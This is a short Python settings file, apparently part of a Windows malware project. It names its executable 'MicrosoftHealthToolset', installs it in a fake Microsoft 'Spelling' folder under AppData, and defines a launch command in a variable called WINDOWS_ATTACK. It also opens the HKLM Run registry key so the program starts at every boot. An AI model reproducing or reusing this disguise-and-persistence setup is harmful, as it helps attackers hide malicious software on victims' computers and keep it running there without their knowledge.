try:
    import winreg
except:
    pass

class Settings:
    WINDOWS_APPLICATION_NAME = "MicrosoftHealthToolset"
    WINDOWS_APPLICATION_HOME = "%AppData%\\Microsoft\\Spelling\\"
    WINDOWS_FULL_PATH = f"{WINDOWS_APPLICATION_HOME}{WINDOWS_APPLICATION_NAME}.exe"
    WINDOWS_ATTACK = f"{WINDOWS_FULL_PATH} --run"

    WINDOWS_WINREG_DIR = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    try:
        WINREG_KEY_PATH = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, WINDOWS_WINREG_DIR)
    except:
        pass
    WINDOWS_WINREG_NAME = f"{WINDOWS_APPLICATION_NAME}"
